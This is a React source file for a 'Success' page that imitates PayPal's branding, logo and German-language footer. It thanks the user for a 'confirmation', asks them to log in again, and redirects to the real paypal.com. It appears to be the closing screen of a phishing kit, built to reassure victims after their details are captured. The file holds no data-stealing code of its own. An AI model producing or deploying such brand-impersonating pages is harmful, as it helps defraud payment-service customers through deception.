import '../styles/PayPalStyle.css';

function Success() {
  return (
    <div className="paypal-container">
      <div className="paypal-form-container">
        <div className="paypal-logo-container">
          <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" alt="PayPal Logo" className="paypal-logo-img" />
        </div>
        
        <form className="paypal-form">
          <h1 className="paypal-form-title">
            Vorgang abgeschlossen
          </h1>
          
          <div style={{ margin: '30px 0', textAlign: 'center' }}>
            <div className="success-icon">
              <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM10 17L5 12L6.41 10.59L10 14.17L17.59 6.58L19 8L10 17Z" fill="#0070ba"/>
              </svg>
            </div>
            <p className="success-message">Vielen Dank für Ihre Bestätigung. Bitte melden Sie sich erneut an, um fortzufahren.</p>
          </div>
          
          <div className="paypal-button-container">
            <button type="button" className="paypal-button-primary" onClick={() => window.location.href = 'https://www.paypal.com'}>
              Zur Anmeldeseite
            </button>
          </div>
        </form>
      </div>
      
      <div className="paypal-footer">
        <a href="#">Kontakt</a>
        <a href="#">Datenschutz</a>
        <a href="#">AGB</a>
        <a href="#">Impressum</a>
        <a href="#">Weltweit</a>
      </div>
      
      <style>{`
        .success-icon {
          margin: 0 auto 20px;
          display: flex;
          justify-content: center;
        }
        
        .success-message {
          color: #2c2e2f;
          font-size: 16px;
          line-height: 1.5;
          margin-bottom: 30px;
        }
      `}</style>
    </div>
  );
}

export default Success;
